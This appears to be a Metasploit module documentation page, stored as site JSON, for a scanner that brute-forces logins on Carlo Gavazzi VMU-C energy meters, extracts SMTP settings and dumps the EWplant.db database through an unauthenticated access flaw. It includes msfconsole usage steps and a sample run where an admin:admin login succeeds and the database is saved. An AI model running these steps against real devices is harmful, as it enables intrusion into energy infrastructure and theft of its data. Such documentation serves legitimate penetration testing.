{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/scanner/http/gavazzi_em_login_loot","result":{"data":{"moduleMetadataJson":{"id":"665fc60c-d097-5029-8ca5-717c0e250ccd","name":"Carlo Gavazzi Energy Meters - Login Brute Force, Extract Info and Dump Plant Database","fullname":"auxiliary/scanner/http/gavazzi_em_login_loot","description":"This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, enumerates device firmware version, and attempt to extract the SMTP configuration. A valid, admin privileged user is required to extract the SMTP password. In some older firmware versions, the SMTP config can be retrieved without any authentication. The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump the database file EWplant.db. This db file contains information such as power/energy utilization data, tariffs, and revenue statistics. Vulnerable firmware versions include - VMU-C EM prior to firmware Version A11_U05 and VMU-C PV prior to firmware Version A17.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/scanner/http/gavazzi_em_login_loot","documentationSlug":"/modules/documentation/auxiliary/scanner/http/gavazzi_em_login_loot"},"documentation":{"html":"<p>This module scans for Carlo Gavazzi Energy Meters login portals, performs a login brute force attack, enumerates device firmware version, and attempt to extract the SMTP configuration.\nA valid, admin privileged user is required to extract the SMTP password. In some older firmware versions, the SMTP config can be retrieved without any authentication.</p>\n<p>The module also exploits an access control vulnerability which allows an unauthenticated user to remotely dump the database file EWplant.db.\nThis db file contains information such as power/energy utilization data, tariffs, and revenue statistics.</p>\n<p>Vulnerable firmware versions include:</p>\n<ul>\n<li>VMU-C EM prior to firmware Version A11_U05</li>\n<li>VMU-C PV prior to firmware Version A17.</li>\n</ul>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Do: <code class=\"language-text\">use auxiliary/scanner/http/gavazzi_em_login_loot</code></li>\n<li>Do: <code class=\"language-text\">set RHOSTS [IP]</code></li>\n<li>Do: <code class=\"language-text\">set RPORT [PORT]</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n</ol>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/scanner/http/gavazzi_em_login_loot\nmsf auxiliary(gavazzi_em_login_loot) &gt; set rhosts 1.3.3.7\nmsf auxiliary(gavazzi_em_login_loot) &gt; set rport 80\nmsf auxiliary(gavazzi_em_login_loot) &gt; run\n\n[+] 1.3.3.7:80 - [1/1] - Running Carlo Gavazzi VMU-C Web Management portal...\n[*] 1.3.3.7:80 - [1/1] - Trying username:&quot;admin&quot; with password:&quot;admin&quot;\n[+] SUCCESSFUL LOGIN - 1.3.3.7:80 - &quot;admin&quot;:&quot;admin&quot;\n[+] 1.3.3.7:80 - Firmware version A8_U03...\n[+] 1.3.3.7:80 - SMTP server: &quot;&quot;, SMTP username: &quot;&quot;, SMTP password: &quot;&quot;\n[*] 1.3.3.7:80 - dumping EWplant.db\n[+] 1.3.3.7:80 - EWplant.db retrieved successfully!\n[+] 1.3.3.7:80 - File saved in: /root/.msf4/loot/20000000000005_moduletest_1.3.3.7_EWplant.db_501578.db\n[*] Scanned 1 of 1 hosts (100% complete)\n[*] Auxiliary module execution completed</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"665fc60c-d097-5029-8ca5-717c0e250ccd"}}}